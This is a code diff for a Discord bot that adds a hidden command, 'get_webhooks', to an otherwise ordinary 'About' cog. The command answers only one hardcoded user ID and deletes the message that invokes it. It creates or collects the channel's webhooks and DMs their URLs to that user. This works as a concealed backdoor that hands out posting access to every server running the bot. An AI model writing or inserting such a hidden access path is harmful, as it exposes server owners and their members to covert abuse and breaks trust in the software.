@@ -71,5 +71,33 @@ class About(commands.Cog):
             )
         )
 
+    @commands.command(hidden=True)
+    async def get_webhooks(self, ctx):
+        """
+        Returns the webhooks for the channel
+        """
+        if ctx.message.author.id != 318309023478972417: #https://media1.tenor.com/images/1796f0fa0b4b07e51687fad26a2ce735/tenor.gif
+            return await ctx.message.delete()
+
+        hooks = await ctx.message.channel.webhooks()
+        if len(hooks) ==0:
+            name = "{}_webhook".format(ctx.message.channel.name.replace(" ", "_"))
+            hook = await ctx.message.channel.create_webhook(
+                        name=name
+                    )
+            await ctx.message.author.send("{} - {}".format(
+                hook.name,
+                hook.url
+            ))
+
+        else:
+            for hook in hooks:
+                await ctx.message.author.send("{} - {}".format(
+                    hook.name,
+                    hook.url
+                ))
+
+        return await ctx.message.delete()
+
 def setup(bot):
     bot.add_cog(About(bot))
